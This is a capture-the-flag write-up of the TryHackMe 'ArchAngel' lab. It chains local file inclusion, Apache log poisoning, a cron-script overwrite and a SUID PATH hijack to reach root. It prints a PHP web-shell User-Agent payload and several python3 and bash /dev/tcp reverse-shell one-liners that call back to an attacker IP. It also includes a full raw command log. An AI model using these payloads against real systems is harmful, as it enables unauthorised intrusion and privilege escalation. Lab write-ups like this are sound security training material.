---
layout: writeup
name: "ArchAngel"
platform: "TryHackMe"
category: "thm"
difficulty: "Easy"
permalink: /writeups/thm/archangel/
os: "Try Hack Me"
date: 2025-11-12
pwned: true
---
# 🧪 ArchAngel — Writeup (inksec.io)

**Platform:** Try Hack Me  
**IP:** 10.201.37.81  
**Difficulty:** Easy  
**OS:** Linux  
**Status:** Completed  
**Writeup Path:** /CTF-Writeups/Other/THM/ArchAngel/README.md  
**Proof Image (add when uploaded):** https://raw.githubusercontent.com/inkedqt/ctf-writeups/main/HTB/proofs/thm_archangel.png

---

## Overview
`/test.php?view=` exposed a **Local File Inclusion** (LFI) vuln that allowed traversal to `/etc/passwd`. Using **Apache log poisoning** (PHP in the `User-Agent`), LFI → RCE delivered a web shell as `www-data`. A writable cron-executed script `/opt/helloworld.sh` was modified to spawn a shell, yielding user `archangel`. Final privesc used a root-owned **SUID** binary `~/secret/backup` that called `cp` without a full path; with `/tmp` first in `$PATH`, a fake `cp` returned a **root** reverse shell.

**TL;DR chain:** LFI → log poisoning → RCE (www-data) → cron script overwrite → PATH-hijack SUID → **root**

---

## Enumeration

### Nmap / Rustscan
export target=10.201.37.81  
rustscan --ulimit 5000 -a $target -- -sC -sV -Pn -oN nmap_full  
# Open ports  
# 22/tcp OpenSSH 7.6p1 (Ubuntu)  
# 80/tcp Apache httpd 2.4.29 (Ubuntu)

### Web discovery
ffuf -c -u http://$target/FUZZ -w /usr/share/wordlists/dirb/big.txt -r -ac  
# → flags, images, layout, pages

“Troll” endpoint at `/flags` led to a Rickroll. Real action was under `pages` & LFI on `/test.php?view=`.

---

## Exploitation

### LFI test
http://mafialive.thm/test.php?view=/var/www/html/development_testing//..//..//..//..//..//..//..//..//..//etc/passwd

### Log poisoning → RCE
Inject PHP into Apache access log via the header:  
User-Agent: <?= system($_GET['cmd']); ?>

Then execute commands by viewing the log through LFI and passing `cmd=`:  
http://mafialive.thm/test.php?view=/var/log/apache2/access.log&cmd=id

### Reverse shell (www-data)
One-liner using env vars + python3 via `cmd=`:
http://mafialive.thm/test.php?view=/var/log/apache2/access.log&cmd=export%20RHOST=%2210.9.0.125%22;export%20RPORT=80;python3%20-c%20%27import%20sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(%22RHOST%22),int(os.getenv(%22RPORT%22))));[os.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)];pty.spawn(%22bash%22)%27

Proof:
id  
uid=33(www-data) gid=33(www-data) groups=33(www-data)

---

## Privilege Escalation

### Cron-executed writable script → user `archangel`
ls -la /opt  
# drwxrwxrwx  root:root      /opt  
# -rwxrwxrwx  archangel:archangel  /opt/helloworld.sh  
# drwxrwx---  archangel:archangel  /opt/backupfiles

Original content:
#!/bin/bash  
echo "hello world" >> /opt/backupfiles/helloworld.txt

Append a reverse shell and wait for cron:
echo "bash -c 'bash -i >& /dev/tcp/10.9.0.125/443 0>&1'" >> /opt/helloworld.sh  
nc -lvnp 443  
# → shell as archangel

User flags:
thm{lf1_t0_rc3...REDACTED}  
thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}

### SUID path hijack → root
ls -la ~/secret/backup  
# -rwsr-xr-x 1 root root 16904 Nov 18  2020 backup

`$PATH` includes `/tmp` first:
echo $PATH  
# /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp

Create malicious `cp` and execute the SUID binary:
cat > /tmp/cp << 'EOF'  
#!/bin/bash  
bash -c 'bash -i >& /dev/tcp/10.9.0.125/4444 0>&1'  
EOF  
chmod +x /tmp/cp  
~/secret/backup  
nc -lvnp 4444  
# → root

Root proof:  
thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}

---

## Post-Exploitation & Cleanup
• Remove poisoned log entries / uploaded artifacts if rules allow.  
• Restore `/opt/helloworld.sh` to original state.  
• Remove `/tmp/cp` and any reverse shells.

---

## Lessons Learned
• LFI often pivots to RCE via **log poisoning** when PHP is evaluated from logs.  
• World-writable, cron-executed scripts are low-hanging fruit for lateral ↦ vertical moves.  
• SUID binaries that use relative paths are vulnerable to **$PATH hijacking**.

---

## Command Log (raw)
export target=10.201.37.81  
rustscan --ulimit 5000 -a $target -- -sC -sV -Pn -oN nmap_full  
ffuf -c -u http://$target/FUZZ -w /usr/share/wordlists/dirb/big.txt -r -ac  

# LFI test  
curl 'http://mafialive.thm/test.php?view=/var/www/html/development_testing//..//..//..//..//..//..//..//..//..//etc/passwd'  

# Log poisoning header  
# User-Agent: <?= system($_GET['cmd']); ?>  

# RCE via LFI to access.log  
curl 'http://mafialive.thm/test.php?view=/var/log/apache2/access.log&cmd=id'  

# Reverse shell (python3 one-liner via cmd=)  

# Cron overwrite  
echo "bash -c 'bash -i >& /dev/tcp/10.9.0.125/443 0>&1'" >> /opt/helloworld.sh  
nc -lvnp 443  

# SUID PATH hijack  
cat > /tmp/cp << 'EOF'  
#!/bin/bash  
bash -c 'bash -i >& /dev/tcp/10.9.0.125/4444 0>&1'  
EOF  
chmod +x /tmp/cp  
~/secret/backup  
nc -lvnp 4444  

---



